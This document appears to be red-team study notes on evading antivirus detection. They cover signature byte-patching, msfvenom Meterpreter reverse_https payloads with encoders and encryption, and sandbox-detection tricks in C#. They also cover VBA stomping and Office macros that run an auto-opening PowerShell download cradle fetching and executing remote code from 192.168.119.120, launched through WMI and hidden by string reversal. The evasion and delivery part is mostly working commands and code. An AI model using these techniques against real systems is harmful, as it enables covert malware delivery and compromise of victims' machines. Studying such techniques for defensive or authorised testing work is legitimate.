# Overview

An AV Software can integrate the following methods into detecting malicious files :-

1. Signature Based Scanning
   - Often relies on SHA-1 or MD5 hashes.
   - It also uses certain unique byte sequences from malicious files for detection.
2. Behavioral Analysis
   - Runs file and a sandboxed environment
   - New approach uses Cloud Computing and Artificial Intelligence for better accuracy

For our testing we will rely on :-

- clamav command line tool
- Avira AV
- Antiscan.me
- Virustotal (This distributes samples to AV vendors) (Use with caution)

&nbsp;

# Signature Based Detection

Initial signature based scans can be bypassed by just changing a few bytes of the file.

Scanning based on byte strings are much harder to bypass as we have to find the exact set of bytes which trigger the AV.

To bypass Signature based scans which look for particular byte strings in the file, we can search for such bytes which trigger the AV and replace them with an alternative.

To do this, we can split the binary into many pieces and perform scans on each one of them. We can recursively do this to replace all the bytes which trigger the AV with a null byte. We also have to set the last byte to 0xFF to bypass the complete file getting detected.

To split the binary, we can use the powershell tool [Find-AVSignature](./../Tools/AV%20Evasion/Find-AVSignature.ps1). Example command :-

    Find-AVSignature -StartByte 0 -EndByte max -Interval 100 -Path mal.exe -OutPath mal_1 -Verbose -Force

Explanation :

- We first have to import the module onto our current powershell session using the command . .\Find-AVSignature.ps1
- The StartByte and Endbyte specify the range through which we want to split the binary, here it is from 0 to max.
- The Interval argument sets the intervals in which the file should be split.
- The OutPath specifies the directory to which the split binaries should be stored

We can then use clamscan on this directory to see which file triggers the AV. Example command :-

    PS C:> .\clamscan.exe mal_1

We can then slowly narrow our search and reduce the interval as we go. To replace the bytes we can use the powershell command :-

    $bytes = [System.IO.File]::ReadAllBytes("mal.exe")
    $bytes[1111] = 0
    [System.IO.File]::WriteAllBytes("mal_mod.exe", $bytes)

Explanation :

- Suppose at byte 1111, the AV was getting triggered.
- We would first convert the whole binary into bytes and store it in a variable
- We then would replace the location with a 0
- Now we would write the bytes into a new file
- Splitting and passing this through clamscan again, the byte would not trigger the AV.

&nbsp;

# Bypassing AV with Metasploit

## Encoders

We can use encoders in metasploit while creating our payload to bypass Signature Based Detection. These are a wide range encoders offered by metasploit. We can list all the encoders using this command :-

    msfvenom -l encoders

_shikata_ga_nai_ is a famous encoder, but it is only made for 32-bit systems. For 64-bit systems we can use _zutto_dekiro_ which is similar to _shikata_ga_nai_

The command for the above encoders are given below :

    msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe -o met_shikata.exe

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -e x64/zutto_dekiru -f exe -o met_zekiro.exe

> We can also add the **-i** option to specify the number of iterations the encoder will run.
> The **-x** option can be added to used to give a template to the msfvenom command.

**NOTE** : As of now, encoders are mainly used to get around bad characters in a shellcode and serve little purpose in bypassing AntiVirus due to their ineffectiveness against the modern AV solutions.

> RESOURCES
>
> - https://danielsauder.com/2015/08/26/an-analysis-of-shikata-ga-nai/
> - https://www.boozallen.com/insights/cyber/tech/zutto-dekiru-encoder-explained.html
> - https://www.rapid7.com/blog/post/2012/12/14/the-odd-couple-metasploit-and-antivirus-solutions/

&nbsp;

## Encrypters

We can list the encrypters offered by metasploit with the following command:

    msfvenom -l encrypt

A sample command using an encrypter :

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> --encrypt aes256 --encrypt-key <RANDOM KEY> -f exe -o mal_aes.exe

This will however get detected due to it's static decryption process. Heurestic scans can easily find out that the file contains malware.

> RESOURCES
>
> - https://www.offensive-security.com/metasploit-unleashed/msfvenom/
> - https://www.rapid7.com/blog/post/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/
> - https://www.rapid7.com/blog/post/2019/11/21/metasploit-shellcode-grows-up-encrypted-and-authenticated-c-shells/

&nbsp;

# Bypasssing AV with C#

## Caesar cipher with XOR-based and AND-based encryption

Let us take a custom written simple C# shellcode runner.

You can find the program [here](./C%23%20Programs/ShellcodeRunner.cs)

Explanation :

- We create a simple C# shellcode runner which uses the Win32 APIs.
- We first allocate space, copy the shellcode into it and then execute it.
- The _WaitForSingleObject_ API prevents the shell from exiting as soon as it is created.
- Detailed explanation of different APIs can be found [here](./../Client-Side-Code-Execution-With-Office/README.md#in-memory-shellcode-runner-in-vba)

We have encrypted it with Caser Cipher along with Xor based encryption. You can find the code [here](./C%23%20Programs/XorEncoder.cs)

The same program but with simple Caesar cipher can be found [here](./C%23%20Programs/CaesarEncoder.cs)

&nbsp;

> RESOURCES
>
> - https://en.wikipedia.org/wiki/XOR_cipher
> - http://practicalcryptography.com/ciphers/caesar-cipher/

&nbsp;

## Sleep Timers

To add on to the above encrpytion methods, we can also add sleep timers to mess with the heurestic based detection. This can easily be implemented using the _Sleep_ Win32 API from _kernel32.dll_

Simple implementation of _Sleep_ Win32 API :-

    ...
    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    static void Main(string[] args)
    {
        DateTime t1 = DateTime.Now;
        Sleep(5000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        if(t2 < 5)
        {
            return;
        }
    }
    ...

Explanation :

- We first use the P/Invoke command to import the API
- We fetch the current time and store it in variable t1
- We then call the _Sleep_ API with 5000 ms (5 sec) as it's argument
- We then get the current time again and subtract it from t1 and store the result in t2
- If t2 is lesser than 5 seconds, then do nothing and exit out from the program.
- In heurestic based scanning, if the AV just skips over sleep statements. Then this is a good way to prevent that from happening.

> Sleep timers aren't as effective as they used to be. It's a plus point to integrate this into the program but effectiveness cannot be gauranteed.

> RESOURCES
>
> - https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep
> - https://docs.microsoft.com/en-us/dotnet/api/system.datetime?view=netframework-4.8

&nbsp;

## Non-Emulated APIs

AV Emulators stimulate the most common APIs, they however cannot process or execute non-emulated APIs and hence crash.
A simple example is the _VirtualAllocExNuma_ (Numa suffix which specifies core optimizations for multi core processors), we can use this instead of _VirtualAllocEx_ .

Function prototype of **_VirtualAllocEx_** :

    LPVOID VirtualAllocEx(
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD flAllocationType,
        DWORD flProtect
    );

Function prototype of **_VirtualAllocExNuma_** :

    LPVOID VirtualAllocExNuma(
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD flAllocationType,
        DWORD flProtect,
        DWORD nndPreferred
    );

The only difference is the extra argument _nndPreferred_ in _VirtualAllocExNuma_ which specifies where the physical memory should reside. We can set this options to "0" to use the first node.

P/Invoke statement :

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

&nbsp;

Code to check for AV Sandbox :

    ...
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
    if(mem == null)
    {
        return;
    }
    ...

Explanation :

- We first import the Win32 API for _VirtualAllocExNuma_ and the _GetCurrentProcess_
- We then start allocating the memory using the API
- If an AV is running the code in sandbox, then the API would not be executed and the value of the variable mem will be null.
- In this case the program would stop execution

&nbsp;

> RESOURCES
>
> - https://docs.microsoft.com/en-gb/windows/win32/procthread/numa-support
> - https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma
> - https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess

&nbsp;

# AV Bypass with Office

## AV Bypass with VBA

A simple Shellcode Runner macro can be found [here](./VBA%20Scripts/ShellcodeRunner.vba)

Explanation :

- We first import the necessary Win32 APIs
- We store the shellcode buffer in a variable and then allocate a buffer space in the memory with the help of _VirtualAlloc_
- Next we copy byte by byte of our shellcode to the allocated buffer and then execute it
- The Document_Open and AutoOpen executes the macro as soon as the document is opened without user intervention.

For encrypting this shellcode, we will use the same Caesar Cipher encryption routine. The program to encrypt the shellcode can be found [here](./C%23%20Programs/vba_encrypt.cs)

Explanation :

- We first take in the shellcode and create variable array with the same length
- We then do a shift of 2 for each byte and do and AND with 0xFF, this is to prevent the byte from going over it's limit.
- The next for loop converts the bytes into decimals after which it prints out the payload.

We can also add sleep commands in our vba script to bypass time-lapse detection implemented by AV.

Code Snippet :

    Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
    ...
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Function
    End If
    ...

Explanation :

- We first fetch the current time and then do a sleep for 2 sec
- If the AV skips this command , then we can do a simple check to see if this was executed. If it is not, then we can be sure that we are in a sandbox and not run the rest of the program and exit out.

> RESOURCES
>
> - https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/now-function
> - https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/datediff-function
> - https://www.c-sharpcorner.com/article/caesar-cipher-in-c-sharp/

&nbsp;

## VBA Stomping

We can use [FlexHex](http://www.flexhex.com/) to unwrap a .doc file. This would help us to look into the structure, files and metadata.

Newer word and Excel documents using the modern macro-enabled formats can be unzipped with 7zip.

**P-code** is a compiled version of the textual VBA code for a specific version of Microsoft Office and VBA it was created on.

This means that if we remove the textual vba code and leave the P-code as it is, then even if the vba code is not present, if the file is opened on the same Microsoft office version, then our compiled code would run and give us a shell.

The version for which the P-code is made can be found in the \_VBA_Project file when opened in FlexHex.

In the hex editor we can select from Attribute VB_Name to the end and replace them with null bytes. Thsi would essentially remove out our VBA code but the compiled P-code would still remain.

AV would see that the vba is empty and not flag it. When opened on a particular version of Microsoft Office, the P-code would be executed and we would get our shell, additionally Office would also decompile our P-code and write back the vba code from the P-code.

This is known as Vba Stomping where we remove out the textual vba code and leave out the compiled P-code.

&nbsp;

> RESOURCES
>
> - https://github.com/clr2of8/Presentations/blob/master/DerbyCon2018-VBAstomp-Final-WalmartRedact.pdf
> - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cfb/53989ce4-7b05-4f8d-829b-d08d6148375b
> - https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/ef7087ac-3974-4452-aab2-7dba2214d239
> - https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/c66b58a6-f8ba-4141-9382-0612abce9926

&nbsp;

## Powershell in VBA

Code snippet :

    Sub MyMacro()
        Dim strArg As String
        strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
        Shell strArg, vbHide
    End Sub

Explanation :

- We first declare the variable to store our powershell command.
- We then execute it using the _Shell_ command and the variable as the aurgument followed by the vbHide to hide the command prompt.

Problems :

- Even though this is only the download cradle for our main shellcode, it would get detected by the AV due to the powershell getting spawned a child process of Office.
- We can bypass this with the help of WMI (Windows Management Instrumentation)

&nbsp;

## Dechaining with WMI

WMI is an old native part of the Windows Operating System and is not well documented. We can use the Win32_Process to create a seperate process of the powershell.

Code :

    Sub MyMacro
        strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
        GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
    End Sub

    Sub AutoOpen()
        Mymacro
    End Sub

Explanation :

- The strArg variable stores the powershell command for the download cradle.
- We then invoke wmi to create a seperate process of powershell and then execute the command in it.
- This would first off create a new process and heurestic based scans which are scanning Office would not flag it.
- The AutoOpen function is to execute macro as soon as the document is opened.

&nbsp;

## Obfuscating VBA

We can now move on the obfuscate vba so that is not picked up by AV.

### String Reverse

Code :

    Sub Mymacro()
        Dim strArg As String
        strArg = StrReverse("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")
        GetObject(StrReverse(":stmgmniw")).Get(StrReverse("ssecorP_23niW")).Create strArg, Null, Null, pid
    End Sub

Explanation :

- The whole string is stored in reverse.
- Using the wmi provider StrReverse, we can reverse the reversed string and then execute it.

Other than these, we can also use random variables and text character based arrays with interconversion between them to make static analysis harder.

&nbsp;

> RESOURCES
>
> - https://en.wikipedia.org/wiki/Obfuscation_(software
> - https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/strreverse-function
> - https://codebeautify.org/reverse-string
